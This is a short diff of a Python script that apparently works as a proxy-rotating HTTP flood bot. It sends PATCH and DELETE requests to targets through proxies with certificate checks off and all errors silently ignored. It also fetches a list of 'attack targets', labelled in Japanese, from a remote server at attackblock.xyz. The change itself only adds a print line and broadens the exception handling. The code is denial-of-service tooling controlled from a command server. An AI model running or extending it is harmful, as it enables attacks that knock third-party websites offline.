@@ -58,7 +58,8 @@ def requester():
                 s.patch(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
             if rdn == 7:
                 s.delete(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
-        except Exception as e:pass
+            print("ok")
+        except:pass
 
 def gettargets():
     global targets
@@ -70,7 +71,7 @@ def gettargets():
             print("完了\n攻撃先一覧を取得中...")
             res = requests.get("https://anbn.attackblock.xyz/?nr&dproxy")
             if res.status_code == 200:targets = res.text.split(",");print("完了")
-        except Exception as e:pass
+        except:pass
         time.sleep(1)
 
 
